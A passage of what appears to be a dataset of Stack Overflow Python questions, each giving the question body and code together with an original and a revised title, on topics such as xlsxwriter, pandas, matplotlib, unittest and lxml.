}}",Autocommit Migration from Django 1.7 to 1.8
Don't ignore exception in python," I'm writing a program that writes data to an Excel file using the xlsxwriter module.The code that opens the workbook is: This used to work. Then I changed some stuff around in the bottom of the program (waaaaay after that line) and now it doesn't work, saying this: This has happened when I forget to close the file before running it again (as it is trying to write to a file that's open in Excel which won't work), but I don't even have Excel open and it does this.How can I fix this? Do I need to restart or something?Also, I tried to have a try...except loop to stop the program if the initialization doesn't work. Even with except: only, without a specific exception, it still completes the program unless I kill it manually. The script basically opens the Excel file, spends a long time downloading data from the Internet, and then writing that to the Excel file. I want it to stop if the initialization doesn't work so I don't have to wait for the script to complete (it can take up to 15 minutes). I'm pretty sure that it has something to do with the fact that it says ""Exception ignored"", but I'm not familiar with all the error-fu in Python.EDIT:I added an excel.close() command right at the end and now it doesn't give me the first error, but a second (and much larger and scarier) one: EDIT 2:The part of the code that actually writes to the file is this: If I replace all the fancy if...else stuff with a single it doesn't give me the error, and seems to work fine.This doesn't provide the functionality I need, as some columns need to be formulas whose numbers change based on the row. What in the above code is causing the excel.close() line to bug out? <code>  excel = xlsxwriter.Workbook('stock.xlsx') Exception ignored in: <bound method Workbook.__del__ of <xlsxwriter.workbook.Workbook object at 0x02C702B0>>Traceback (most recent call last): File ""c:\python34\lib\site-packages\xlsxwriter\workbook.py"", line 147, in __del__ raise Exception(""Exception caught in workbook destructor. ""Exception: Exception caught in workbook destructor. Explicit close() may be required for workbook. Traceback (most recent call last): File ""C:\Users\carte_000\Python\stock_get_rev8.py"", line 161, in <module> excel.close() File ""c:\python34\lib\site-packages\xlsxwriter\workbook.py"", line 287, in close self._store_workbook() File ""c:\python34\lib\site-packages\xlsxwriter\workbook.py"", line 510, in _store_workbook xml_files = packager._create_package() File ""c:\python34\lib\site-packages\xlsxwriter\packager.py"", line 132, in _create_package self._write_worksheet_files() File ""c:\python34\lib\site-packages\xlsxwriter\packager.py"", line 189, in _write_worksheet_files worksheet._assemble_xml_file() File ""c:\python34\lib\site-packages\xlsxwriter\worksheet.py"", line 3395, in _assemble_xml_file self._write_sheet_data() File ""c:\python34\lib\site-packages\xlsxwriter\worksheet.py"", line 4802, in _write_sheet_data self._write_rows() File ""c:\python34\lib\site-packages\xlsxwriter\worksheet.py"", line 4988, in _write_rows self._write_cell(row_num, col_num, col_ref) File ""c:\python34\lib\site-packages\xlsxwriter\worksheet.py"", line 5148, in _write_cell xf_index = cell.format._get_xf_index()AttributeError: type object 'str' has no attribute '_get_xf_index' for r, row in enumerate(data): for c, cell in enumerate(row): if 'percent' in formats[c]: sheet.write(r + r_offset, c + c_offset, cell, eval(formats[c].replace('_f', ''))) elif '_f' in formats[c]: sheet.write(r + r_offset, c + c_offset, cell.format(n=str(r + r_offset)), eval(formats[c].replace('_f', ''))) else: sheet.write(r + r_offset, c + c_offset, cell, eval(formats[c][0] + formats[c].replace('_f', '')[-1])) sheet.write(r + r_offset, c + c_offset, cell)",xlsxwriter module won't open/close Excel file correctly
How to generate consecutive list of numbers from one large number input," Say if you had a number input 8 in python and you wanted to generate a list of consecutive numbers up to 8 like How could you do this? <code>  [0, 1, 2, 3, 4, 5, 6, 7, 8]",How can I generate a list of consecutive numbers?
How can I generate consecutive list of numbers?," Say if you had a number input 8 in python and you wanted to generate a list of consecutive numbers up to 8 like How could you do this? <code>  [0, 1, 2, 3, 4, 5, 6, 7, 8]",How can I generate a list of consecutive numbers?
Q: How to delete a CSV file in Python," I'm doing a project which requires me to add, delete data that is in a CSV file, the way I have done it is by creating a new CSV file called outfile.csv, which holds all the information from another CSV file called infile.csv (outfile.csv has some rows which I deleted), so outfile.csv is basically a temp file.Is there anyway I could delete the CSV file (I've seen a few questions like these but all the answers say to just truncate the CSV file)?Here's my code: <code>  __row_num1 = __row_num.get()FIRST_ROW_NUM = 1rows_to_delete = {__row_num1}with open(""./user_info/"" + Username + "".csv"", ""rt"") as infile, open('outfile.csv', 'wt') as outfile: outfile.writelines(row for row_num, row in enumerate(infile, FIRST_ROW_NUM)if row_num not in rows_to_delete)infile.close()outfile.close()USER_INFO_FILE = open(""outfile.csv"")outfile_dict = []read_file = csv.reader(USER_INFO_FILE)for row in read_file: outfile_dict.append(row)USER_INFO_FILE.closef = open(""./user_info/"" + Username + "".csv"", ""w"")f.truncate()f.closewriter = csv.writer(open(""./user_info/"" + Username + "".csv"", ""ab""), delimiter=',')writer.writerows(outfile_dict)",How to delete a CSV file in Python
I have a string. How do I convert dict or list?," I have strings such as:'[1, 2, 3]'and""{'a': 1, 'b': 2}""How do I convert them to list/dict?Someone mentions that ast.literal_eval or eval can parse a string that converts to list/dict.What's the difference between ast.literal_eval and eval? <code> ",How can I convert string to dict or list?
I have a string. How do I convert it to dict or list?," I have strings such as:'[1, 2, 3]'and""{'a': 1, 'b': 2}""How do I convert them to list/dict?Someone mentions that ast.literal_eval or eval can parse a string that converts to list/dict.What's the difference between ast.literal_eval and eval? <code> ",How can I convert string to dict or list?
Add raster image to HDF5 using h5py," I apologize if this is sort of a newbie question, but I am fairly new to Python and HDF5. I am using h5py, numpy, and Python 2.7. I have data from various files that need to be imported into one HDF5 file. The data from each file is to be stored in a different group. Each of these groups needs to contain 1) the raw data from the file as an m x n matrix and 2) an image raster generated from normalized raw data.I am able to accomplish part 1, and am able to normalize the data, but I am not able to write this normalized data to a raster image because I don't know how to add a raster image to a group. It seems like there should be an easy, straightforward way to do this, but I have read the documentation and haven't found one. How would one do this in h5py, and if it can't be done using h5py, what should I use to accomplish this?Thanks!! <code> ",Add raster image to HDF5 file using h5py
GAE Setup of version 1.9.18," I'm having exactly the same problem like this one: google-app-engine 1.9.19 deploy failurePlease, someone can explain me how to get an older version of GAE's SDKs?In this particular case I need the version 1.9.18 for Python. <code> ",How to get an old Google App Engine SDK version
what is the proper way to print a nested list with the highest value in python," I have a a nested list and I'm trying to get the sum and print the list that has the highest numerical value when the individual numbers are summed together I've been able to print out the results but I think there should be a simple and more Pythonic way of doing this (Maybe using a list comprehension). How would I do this? <code>  x = [[1,2,3],[4,5,6],[7,8,9]]highest = list()for i in x: highest.append(sum(i))for ind, a in enumerate(highest): if a == max(highest): print(x[ind])",What is the proper way to print a nested list with the highest value in Python
matplotlib make axis ticks label bold," I want to have bold labels on my axis, so I can use the plot for publication. I also need to have the label of the lines in the legend plotted in bold.So far I can set the axis labels and the legend to the size and weight I want. I can also set the size of the axis labels to the size I want, however I am failing with the weight.Here is an example code: And this is what I get:Any idea what I am missing or doing wrong in order to get the axis ticks label in bold?EDITI have updated my code using toms response. However I now have another problem, as I need to use datetime on the x-axis, this has not the same effect as on the normal y-axis (sorry for not putting this in in the original question, but I did not think it would change things): Now my result looks like this:It seems to be that the changes doe not affect the display or rather the weight of the x-axis ticks labels. <code>  # plotting libsfrom pylab import *from matplotlib import rcif __name__=='__main__': tmpData = np.random.random( 100 ) # activate latex text rendering rc('text', usetex=True) rc('axes', linewidth=2) rc('font', weight='bold') #create figure f = figure(figsize=(10,10)) ax = gca() plot(np.arange(100), tmpData, label=r'\textbf{Line 1}', linewidth=2) ylabel(r'\textbf{Y-AXIS}', fontsize=20) xlabel(r'\textbf{X-AXIS}', fontsize=20) fontsize = 20 fontweight = 'bold' fontproperties = {'family':'sans-serif','sans-serif':['Helvetica'],'weight' : fontweight, 'size' : fontsize} ax.set_xticklabels(ax.get_xticks(), fontproperties) ax.set_yticklabels(ax.get_yticks(), fontproperties) for tick in ax.xaxis.get_major_ticks(): tick.label1.set_fontsize(fontsize) for tick in ax.yaxis.get_major_ticks(): tick.label1.set_fontsize(fontsize) legend() show() sys.exit() # plotting libsfrom pylab import *from matplotlib import rc, rcParamsimport matplotlib.dates as dates# datetimeimport datetimeif __name__=='__main__': tmpData = np.random.random( 100 ) base = datetime.datetime(2000, 1, 1) arr = np.array([base + datetime.timedelta(days=i) for i in xrange(100)]) # activate latex text rendering rc('text', usetex=True) rc('axes', linewidth=2) rc('font', weight='bold') rcParams['text.latex.preamble'] = [r'\usepackage{sfmath} \boldmath'] #create figure f = figure(figsize=(10,10)) ax = gca() plot(np.arange(100), tmpData, label=r'\textbf{Line 1}', linewidth=2) ylabel(r'\textbf{Y-AXIS}', fontsize=20) xlabel(r'\textbf{X-AXIS}', fontsize=20) ax.xaxis.set_tick_params(labelsize=20) ax.yaxis.set_tick_params(labelsize=20) ax.xaxis.set_major_formatter(dates.DateFormatter('%m/%Y')) ax.xaxis.set_major_locator(dates.MonthLocator(interval=1)) legend()",matplotlib make axis ticks label for dates bold
Python change amount of parallel processes in certain cases," I have a python script which runs a method in parallel. process_items is my method and items is a list of tuples with two elements to each tuple. The items list has around 100k items.process_items will then call a method depending on what parameters are given. My problem being maybe 70% of the list I can run with high parallelism but the other 30% can only run with 1/2 threads otherwise will cause a failure outside of my control.So in my code I have around 10 different parser processes. For say 1-8 I want to run with Pool(4) but 9-10 Pool(2).What is the best way to optimise this? <code>  parsers = { 'parser1': parser1.process, 'parser2': parser2.process}def process((key, value)): parsers[key](value)pool = Pool(4)pool.map(process_items, items)",How to change number of parallel processes?
converting string 'yyyy-mm-dd' into datetime python," I have a raw input from the user such as ""2015-01-30""...for the query I am using, the date has to be inputed as a string as such ""yyyy-mm-dd"".I would like to increment the date by 1 month at end of my loop s.t ""2015-01-30"" becomes ""2015-02-27"" (ideally the last business day of the next month). I was hoping someone could help me; I am using PYTHON, the reason I want to convert to datetime is I found a function to add 1 month.Ideally my two questions to be answered are (in Python):1) how to convert string ""yyyy-mm-dd"" into a python datetime and convert back into string after applying a timedelta function2) AND/or how to add 1 month to string ""yyyy-mm-dd""  <code> ",Converting string 'yyyy-mm-dd' into datetime
Python - How to exit the script in unittest test case," Here is a sample script that checks for a precondition in the very first test case and my intention is to abort the script if the precondition is not met. However, the sys.exit() only exits from the individual test case of the suite. It doesn't exit the whole script.I understand that unittest treats each test case individually which is why any exceptions caused by any testcase are handled by the test runner and it proceeds to the next test case.But I want the script to kill itself. How do I do that?Here is the output of my script: My guess is that I have to mess around with TestRunner and kill the script if a test case returns some signal. But I am not sure how to really achieve it. <code>  #!/usr/bin/pythonimport unittestimport sysclass TestMyScript(unittest.TestCase): def test_000_prerequisite(self): a = 0 if not a: sys.exit() return def test_001_test1(self): print ""Inside test 1"" return def test_002_test2(self): print ""Inside test 2"" returnif __name__ == ""__main__"": unittest.main() ./temp.pyEInside test 1.Inside test 2.======================================================================ERROR: test_000_prerequisite (__main__.TestMyScript)----------------------------------------------------------------------Traceback (most recent call last): File ""./temp.py"", line 9, in test_000_prerequisite sys.exit()SystemExit----------------------------------------------------------------------Ran 3 tests in 0.000sFAILED (errors=1)",How to exit the script in a unittest test case
How to exit the script in unittest test case," Here is a sample script that checks for a precondition in the very first test case and my intention is to abort the script if the precondition is not met. However, the sys.exit() only exits from the individual test case of the suite. It doesn't exit the whole script.I understand that unittest treats each test case individually which is why any exceptions caused by any testcase are handled by the test runner and it proceeds to the next test case.But I want the script to kill itself. How do I do that?Here is the output of my script: My guess is that I have to mess around with TestRunner and kill the script if a test case returns some signal. But I am not sure how to really achieve it. <code>  #!/usr/bin/pythonimport unittestimport sysclass TestMyScript(unittest.TestCase): def test_000_prerequisite(self): a = 0 if not a: sys.exit() return def test_001_test1(self): print ""Inside test 1"" return def test_002_test2(self): print ""Inside test 2"" returnif __name__ == ""__main__"": unittest.main() ./temp.pyEInside test 1.Inside test 2.======================================================================ERROR: test_000_prerequisite (__main__.TestMyScript)----------------------------------------------------------------------Traceback (most recent call last): File ""./temp.py"", line 9, in test_000_prerequisite sys.exit()SystemExit----------------------------------------------------------------------Ran 3 tests in 0.000sFAILED (errors=1)",How to exit the script in a unittest test case
How to check the current version of sympy and upgrade to latest, How to check the current version of SymPy and upgrade to the latest version?I am using macOS. The way I installed my current version is using pip install sympy. <code> ,How to check the current version of sympy and upgrade to the latest version?
python password generator exercise inquiry," I'm practicing some Python and I'm having trouble understanding why this code won't take - function takes a string and if it's at least 10 characters in length, has at least 1 digit, 1 lowercase, and 1 uppercase letter, it should return True. Also, there's gotta be a more succinct way to write this than I did with all these nested conditionals. Thanks all! <code>  import stringalphalower = string.ascii_lowercasealphaupper = string.ascii_uppercasedigs = string.digitsdef checkio(data): if len(data) >= 10: if data.count(digs) >= 1: if data.count(alphaupper) >= 1: if data.count(alphalower) >= 1: return True else: return False",python password rules validation
Pandas resample Python," I have a Yahoo finance daily stock price imported in a pandas dataframe. I want to use .resample() to convert it to the monthly stock price by taking the price of the first QUOTED daily price of each month. returns the correct price of each month but it changes the index to the first day of the month while in general the first day of a month for a quoted price maybe 2nd or 3rd of the month because of holidays and weekends.How can I use resample() by only resampling the existing dates and not changing them? <code>  .resample('MS', how='first')",Pandas resample by first day in my data
Subprocess file not found in python script," Executing following command and its variations always results in an error, which I just cannot figure out: WHich file it is referring to ? other commands like ls,wc are running correctly though, the command is also running well on terminal but not python script. <code>  command = ""/bin/dd if=/dev/sda8 count=100 skip=$(expr 19868431049 / 512)""print subprocess.check_output([command])Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""/usr/lib/python2.7/subprocess.py"", line 566, in check_output process = Popen(stdout=PIPE, *popenargs, **kwargs) File ""/usr/lib/python2.7/subprocess.py"", line 710, in __init__ errread, errwrite) File ""/usr/lib/python2.7/subprocess.py"", line 1327, in _execute_child raise child_exceptionOSError: [Errno 2] No such file or directory",subprocess.check_output(): OSError file not found in Python
OSError: [Errno 63] File name too long:," I need to convert a web page to XML (using Python 3.4.3). If I write the contents of the URL to a file then I can read and parse it perfectly but if I try to read directly from the web page I get the following error in my terminal: File ""./AnimeXML.py"", line 22, in xml = ElementTree.parse (xmlData) File ""/Library/Frameworks/Python.framework/Versions/3.4/lib/python3.4/xml/etree/ElementTree.py"", line 1187, in parse tree.parse(source, parser) File ""/Library/Frameworks/Python.framework/Versions/3.4/lib/python3.4/xml/etree/ElementTree.py"", line 587, in parse source = open(source, ""rb"") OSError: [Errno 36] File name too long:My python code: Is there any way I can fix my code so that I can read the web page directly into python without getting this error? <code>  # AnimeXML.py#! /usr/bin/Python# Import xml parser.import xml.etree.ElementTree as ElementTree# XML to parse.sampleUrl = ""http://cdn.animenewsnetwork.com/encyclopedia/api.xml?anime=16989""# Read the xml as a file.content = urlopen (sampleUrl)# XML content is stored here to start working on it.xmlData = content.readall().decode('utf-8')# Close the file.content.close()# Start parsing XML.xml = ElementTree.parse (xmlData)# Get root of the XML file.root = xml.getroot()for info in root.iter(""info""): print (info.attrib)",OSError: [Errno 36] File name too long:
Ubuntu 14.04 - Python 3.4 - Command Not Found, I am trying to create a virtual environment for Python 3.4 on a fresh install of Ubuntu Server 14.04. I following the instructions for the venv module at:https://docs.python.org/3/library/venv.html#module-venvI don't have a lot of Python 3.4 or Ubuntu experience. When I type the command: I get back: What is causing this? <code>  pyvenv testDir pyvenv: command not found,Ubuntu 14.04 - Python 3.4 - pyenv: command Not Found
"Why do people use this notation for lists in Python: ""someList[:]""?"," I sometimes get across this way of printing or returning a list - someList[:].I don't see why people use it, as it returns the full list.Why not simply write someList, whithout the [:] part? <code> ","What does this notation do for lists in Python: ""someList[:]""?"
Why might Python's `from` statement bind a module name?," I have a Python project with the following structure: All of the modules are empty except testapp/api/__init__.py which has the following code: and testapp/api/utils.py which defines x: Now from the root I import testapp.api: The result of the import surprises me, because it shows that the second import statement has overwritten utils. Yet the docs state that the from statement will not bind a module name: The from form does not bind the module name: it goes through the list of identifiers, looks each one of them up in the module found in step (1), and binds the name in the local namespace to the object thus found.And indeed, when in a terminal I use a from ... import ... statement, no module names are introduced: I suspect this has to do with Python, at the time of the second import statement, trying to import testapp.api.utils which refers to testapp.utils and failing but I'm not certain.What is happening here? <code>  testapp/ __init__.py api __init__.py utils.py utils.py from testapp import utilsprint ""a"", utilsfrom testapp.api.utils import xprint ""b"", utils x = 1 $ export PYTHONPATH=$PYTHONPATH:.$ python -c ""import testapp.api""a <module 'testapp.utils' from 'testapp/utils.pyc'>b <module 'testapp.api.utils' from 'testapp/api/utils.pyc'> >>> from os.path import abspath>>> pathTraceback (most recent call last): File ""<stdin>"", line 1, in <module>NameError: name 'path' is not defined",Why might Python's `from` form of an import statement bind a module name?
Why might Python's the `from` form of an import statement bind a module name?," I have a Python project with the following structure: All of the modules are empty except testapp/api/__init__.py which has the following code: and testapp/api/utils.py which defines x: Now from the root I import testapp.api: The result of the import surprises me, because it shows that the second import statement has overwritten utils. Yet the docs state that the from statement will not bind a module name: The from form does not bind the module name: it goes through the list of identifiers, looks each one of them up in the module found in step (1), and binds the name in the local namespace to the object thus found.And indeed, when in a terminal I use a from ... import ... statement, no module names are introduced: I suspect this has to do with Python, at the time of the second import statement, trying to import testapp.api.utils which refers to testapp.utils and failing but I'm not certain.What is happening here? <code>  testapp/ __init__.py api __init__.py utils.py utils.py from testapp import utilsprint ""a"", utilsfrom testapp.api.utils import xprint ""b"", utils x = 1 $ export PYTHONPATH=$PYTHONPATH:.$ python -c ""import testapp.api""a <module 'testapp.utils' from 'testapp/utils.pyc'>b <module 'testapp.api.utils' from 'testapp/api/utils.pyc'> >>> from os.path import abspath>>> pathTraceback (most recent call last): File ""<stdin>"", line 1, in <module>NameError: name 'path' is not defined",Why might Python's `from` form of an import statement bind a module name?
Why are slice objects not hasable in python," Why are slice objects in python not hashable: They seem to be immutable: Context, I'd like to make a dictionary that maps python ints or slice objects to some values, something like this: As a workaround I need to special case slices: This isn't a big deal, I'd just like to know if there is some reasoning behind it. <code>  >>> s = slice(0, 10)>>> hash(s)TypeError Traceback (most recent call last)<ipython-input-10-bdf9773a0874> in <module>()----> 1 hash(s)TypeError: unhashable type >>> s.start = 5TypeError Traceback (most recent call last)<ipython-input-11-6710992d7b6d> in <module>()----> 1 s.start = 5TypeError: readonly attribute class Foo: def __init__(self): self.cache = {} def __getitem__(self, idx): if idx in self.cache: return self.cache[idx] else: r = random.random() self.cache[idx] = r return r class Foo: def __init__(self): self.cache = {} def __getitem__(self, idx): if isinstance(idx, slice): idx = (""slice"", idx.start, idx.stop, idx.step) if idx in self.cache: return self.cache[idx] else: r = random.random() self.cache[idx] = r return r",Why are slice objects not hashable in python
Printing 2 Python Pandas DataFrame in iPython Notebook," Question: How can you print 2 DataFrame tables together from 1 iPython Notebook row, such that both tables are displayed in the pretty table format? The following prints just the second one, and print df.head() does not produce a pretty table. The following does not produce the pretty table needed: <code>  df = pd.DataFrame(np.random.randn(6,4), index=pd.date_range('20150101', periods=6), columns=list('ABCD'))df2 = pd.DataFrame(np.random.randn(6,4), index=pd.date_range('20150101', periods=6), columns=list('WXYZ'))df.head()df2.head() print df.head()print df2.head()",Printing 2 Python Pandas DataFrame in HTML Tables in iPython Notebook
product of a list in python (not quite cartesian)," This is the problem I have. Given a list I would like to calculate for sum of each element multiplied by subsequent elements in this case the answer is 608.Is there a way to do this perhaps with itertools or natively with numpy? Below is a function I came up with. It does the job but it is far from ideal as I would like to add other stuff as well. Any help appreciated. N.B: In case you wonder, I am trying to implement Krippendorf's alpha with pandas <code>  xList = [9, 13, 10, 5, 3] sum([9*13, 9*10, 9*5 , 9*3]) + sum([13*10, 13*5, 13*3]) + sum([10*5, 10*3]) + sum ([5*3]) def SumProduct(xList): ''' compute the sum of the product of a list e.g. xList = [9, 13, 10, 5, 3] the result will be sum([9*13, 9*10, 9*5 , 9*3]) + sum([13*10, 13*5, 13*3]) + sum([10*5, 10*3]) + sum ([5*3]) ''' xSum = 0 for xnr, x in enumerate(xList): #print xnr, x xList_1 = np.array(xList[xnr+1:]) #print x * xList_1 xSum = xSum + sum(x * xList_1) return xSum",Sum of products of pairs in a list
cython showing error while running," I have written a small cython code that is the setup.py file is I run setup.py using this command This gives me When I run in the python interpreter it shows me <code>  #t3.pyxfrom libc.stdlib cimport atoicdef int fun(char *s): return atoi(s) from distutils.core import setupfrom Cython.Build import cythonizesetup(ext_modules=cythonize(""t3.pyx"")) python setup.py build_ext --inplace Compiling t3.pyx because it changed.Cythonizing t3.pyxrunning build_extbuilding 't3' extensionx86_64-linux-gnu-gcc -pthread -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict- prototypes -fno-strict-aliasing -D_FORTIFY_SOURCE=2 -g -fstack-protector- strong -Wformat -Werror=format-security -fPIC -I/usr/include/python2.7 -c t3.c -o build/temp.linux-x86_64-2.7/t3.ot3.c:556:12: warning: __pyx_f_2t3_fun defined but not used [-Wunused-function] static int __pyx_f_2t3_fun(char *__pyx_v_s) { ^x86_64-linux-gnu-gcc -pthread -shared -Wl,-O1 -Wl,-Bsymbolic-functions -Wl,-Bsymbolic-functions -Wl,-z,relro -fno-strict-aliasing -DNDEBUG -g -fwrapv -O2 -Wall -Wstrict-prototypes -D_FORTIFY_SOURCE=2 -g -fstack-protector-strong -Wformat -Werror=format-security -Wl,-Bsymbolic-functions -Wl,-z,relro -D_FORTIFY_SOURCE=2 -g -fstack-protector-strong -Wformat -Werror=format-security build/temp.linux-x86_64-2.7/t3.o -o /home/debesh/Documents/cython/t3/t3.so >>> import t3>>> t3.fun('1234')Traceback (most recent call last): File ""<stdin>"", line 1, in <module>AttributeError: 'module' object has no attribute 'fun'>>> ",Importing cython function: AttributeError: 'module' object has no attribute 'fun'
Changing an elements tag in xml using lxml in python," Following on from Removing child elements in XML using python ...Thanks to @Tichodroma, I have this code:If you can use lxml, try this: Now leg.out.xml looks like this: How do I modify my code to remove the Leg1: namespace prefix from all of the elements' tag names? <code>  import lxml.etree tree = lxml.etree.parse(""leg.xml"") for dog in tree.xpath(""//Leg1:Dog"", namespaces={""Leg1"": ""http://what.not""}): parent = dog.xpath("".."")[0] parent.remove(dog) parent.text = None tree.write(""leg.out.xml"") <?xml version=""1.0""?> <Leg1:MOR xmlns:Leg1=""http://what.not"" oCount=""7""> <Leg1:Order> <Leg1:CTemp id=""FO""> <Leg1:Group bNum=""001"" cCount=""4""/> <Leg1:Group bNum=""002"" cCount=""4""/> </Leg1:CTemp> <Leg1:CTemp id=""GO""> <Leg1:Group bNum=""001"" cCount=""4""/> <Leg1:Group bNum=""002"" cCount=""4""/> </Leg1:CTemp> </Leg1:Order> </Leg1:MOR>",How can I strip namespaces out of an lxml tree?
Overriding dict update() method in subclass to prevent overwriting dict keys," Earlier today, I read the question ""Raise error if python dict comprehension overwrites a key"" and decided to try my hand at an answer. The method that naturally occurred to me was to subclass dict for this. However, I got stuck on my answer, and now I'm obsessed with getting this worked out for myself. Notes:No - I do not plan on turning in the answer to this question as an answer to the other question.This is purely an intellectual exercise for me at this point. As a practical matter, I would almost certainly use a namedtuple or a regular dictionary wherever I have a requirement for something like this.My (not quite working) Solution: My Tests and Expected Results I'm certain the issue is in my update() method, but I'm not able to determine just what I'm doing wrong.Below is the original version of my update() method. This version fails as expected on duplicates when calling my_dict.update({k: v}) for a key/value pair already in the dict, but does not fail when including a duplicate key while creating the original dict, due to the fact that converting the args to a dict results in default behavior for a dictionary, i.e., overwriting the duplicate key. <code>  class DuplicateKeyError(KeyError): passclass UniqueKeyDict(dict): def __init__(self, *args, **kwargs): self.update(*args, **kwargs) def __setitem__(self, key, value): if key in self: # Validate key doesn't already exist. raise DuplicateKeyError('Key \'{}\' already exists with value \'{}\'.'.format(key, self[key])) super().__setitem__(key, value) def update(self, *args, **kwargs): if args: if len(args) > 1: raise TypeError('Update expected at most 1 arg. Got {}.'.format(len(args))) else: try: for k, v in args[0]: self.__setitem__(k, v) except ValueError: pass for k in kwargs: self.__setitem__(k, kwargs[k]) >>> ukd = UniqueKeyDict((k, int(v)) for k, v in ('a1', 'b2', 'c3', 'd4')) # Should succeed.>>> ukd['e'] = 5 # Should succeed.>>> print(ukd){'a': 1, 'b': 2, 'c': 3, d: 4, 'e': 5}>>> ukd['a'] = 5 # Should fail.Traceback (most recent call last): File ""<stdin>"", line 1, in <module> File ""<stdin>"", line 8, in __setitem____main__.DuplicateKeyError: Key 'a' already exists with value '1'.>>> ukd.update({'a': 5}) # Should fail.>>> ukd = UniqueKeyDict((k, v) for k, v in ('a1', 'b2', 'c3', 'd4', 'a5')) # Should fail.>>> def update(self, *args, **kwargs): for k, v in dict(*args, **kwargs).items(): self.__setitem__(k, v)",Overriding dict.update() method in subclass to prevent overwriting dict keys
Smoothed Rolling Correlation Matrix in Python from Yahoo Finance," Python beginner here.What I've done so far:Imported price data from Yahoo Finance from a list of stocks.Between the stocks (every combination), computed the 20 day rolling correlation into a dataframe.I would like to:1) Calculate the 200 day simple moving average for each of the 20 day rolling correlations. 2) Report the 200 day moving average results in a matrix.How to do this in python/pandas? Thanks, this would help me out a ton!Here is what I have so far... <code>  import pandas as pdfrom pandas import DataFrameimport datetimeimport pandas.io.data as webfrom pandas.io.data import DataReaderstocks = ['spy', 'gld', 'uso']start = datetime.datetime(2014,1,1)end = datetime.datetime(2015,1,1)f = web.DataReader(stocks, 'yahoo', start, end)adj_close_df = f['Adj Close']correls = pd.rolling_corr(adj_close_df, 20)means = pd.rolling_mean(correls, 200) #<---- I get an error message here!",Rolling Mean of Rolling Correlation dataframe in Python?
Limit Memory usage in Python," I run Python 2.7 on a Linux machine with 16GB Ram and 64 bit OS. A python script I wrote can load too much data into memory, which slows the machine down to the point where I cannot even kill the process any more.While I can limit memory by calling: in my shell before running the script, I'd like to include a limiting option in the script itself. Everywhere I looked, the resource module is cited as having the same power as ulimit. But calling: at the beginning of my script does absolutely nothing. Even setting the value as low as 12000 never crashed the process. I tried the same with RLIMIT_STACK, as well with the same result. Curiously, calling: does nothing as well.What am I doing wrong? I couldn't find any actual usage examples online.edit: For anyone who is curious, using subprocess.call doesn't work because it creates a (surprise, surprise!) new process, which is independent of the one the current python program runs in. <code>  ulimit -v 12000000 import resource_, hard = resource.getrlimit(resource.RLIMIT_DATA)resource.setrlimit(resource.RLIMIT_DATA, (12000, hard)) import subprocesssubprocess.call('ulimit -v 12000', shell=True)",How to limit memory usage within a python process
Limit memory usage?," I run Python 2.7 on a Linux machine with 16GB Ram and 64 bit OS. A python script I wrote can load too much data into memory, which slows the machine down to the point where I cannot even kill the process any more.While I can limit memory by calling: in my shell before running the script, I'd like to include a limiting option in the script itself. Everywhere I looked, the resource module is cited as having the same power as ulimit. But calling: at the beginning of my script does absolutely nothing. Even setting the value as low as 12000 never crashed the process. I tried the same with RLIMIT_STACK, as well with the same result. Curiously, calling: does nothing as well.What am I doing wrong? I couldn't find any actual usage examples online.edit: For anyone who is curious, using subprocess.call doesn't work because it creates a (surprise, surprise!) new process, which is independent of the one the current python program runs in. <code>  ulimit -v 12000000 import resource_, hard = resource.getrlimit(resource.RLIMIT_DATA)resource.setrlimit(resource.RLIMIT_DATA, (12000, hard)) import subprocesssubprocess.call('ulimit -v 12000', shell=True)",How to limit memory usage within a python process
Python - string split with default delimiter vs user defined delimiter," I tried a simple example with string split, but get some unexpected behavior. Here is the sample code: As you can see, I got an extra empty string at the end of the list when I use space as delimiter argument for split() function. However, if I don't pass in any argument for split() function, I got no empty string at the end of the output list.From what I read in python docs, they said the default argument for split() is space. So, why when I explicitly pass in a ' ' as delimiter, it creates an empty string at the end of the output list?  <code>  def split_string(source,splitlist): for delim in splitlist: source = source.replace(delim, ' ') return source.split(' ')out = split_string(""This is a test-of the,string separation-code!"", "" ,!-"")print out>>> ['This', 'is', 'a', 'test', 'of', 'the', 'string', 'separation', 'code', '']",String split with default delimiter vs user defined delimiter
Python: Fitting data with integral function," When using curve_fit from scipy.optimize to fit a some data in python, one first defines the fitting function (e.g. a 2nd order polynomial) as follows:def f(x, a, b): return a*x**2+b*xAnd then proceeds with the fitting popt, pcov = curve_fit(f,x,y)But the question is now, how does one go about defining the function in point 1. if the function contains an integral (or a discrete sum), e.g.:The experimental data is still given for x and f(x), so point 2. would be similar I imagine once I can define f(x) in python. By the way I forgot to say that it is assumed that g(t) has a well known form here, and contains the fitting parameters, i.e. parameters like a and b given in the polynomial example. Any help is much appreciated. The question is really supposed to be a generic one, and the functions used in the post are just random examples. <code> ",Fitting data with integral function
python pandas extract year from datetime --- df['year'] = df['date'].year is not working," I import a dataframe via read_csv, but for some reason can't extract the year or month from the series df['date'], trying that gives AttributeError: 'Series' object has no attribute 'year': UPDATE:and when I try solutions with df['date'].dt on my pandas version 0.14.1, I get ""AttributeError: 'Series' object has no attribute 'dt' "": Sorry for this question that seems repetitive - I expect the answer will make me feel like a bonehead... but I have not had any luck using answers to the similar questions on SO.FOLLOWUP: I can't seem to update my pandas 0.14.1 to a newer release in my Anaconda environment, each of the attempts below generates an invalid syntax error. I'm using Python 3.4.1 64bit. Any ideas? <code>  date Count6/30/2010 5257/30/2010 1368/31/2010 1259/30/2010 8410/29/2010 4469df = pd.read_csv('sample_data.csv', parse_dates=True)df['date'] = pd.to_datetime(df['date'])df['year'] = df['date'].yeardf['month'] = df['date'].month df = pd.read_csv('sample_data.csv',parse_dates=True)df['date'] = pd.to_datetime(df['date'])df['year'] = df['date'].dt.yeardf['month'] = df['date'].dt.month conda update pandasconda install pandas==0.15.2conda install -f pandas",python pandas extract year from datetime: df['year'] = df['date'].year is not working
How can i add an image (Python)," How can I add image to my Turtle Screen using turtle graphics?whenever I use the function addshape I keep getting errors.does turtle graphics got any other way loading/importing images?for example:  <code>  import turtlescreen = turtle.Screen()image = r""C:\Users\myUser\Desktop\Python\rocketship.png""screen.addshape(image)turtle.shape(image)",adding an image to the Turtle Screen
Range(n)[x:y:z] in Python 2.7," Not sure what the arguments inside the [ ] really do after the range() function.Exp: print ( range(5)[::-2])Output: [4, 2, 0]But if [x:y:z] stands for [start:stop:step], then when I put print(range(5)[4:-2:-2]), the output list is [4] instead of [4, 2, 0], not sure how that works. <code> ",range(n)[x:y:z]
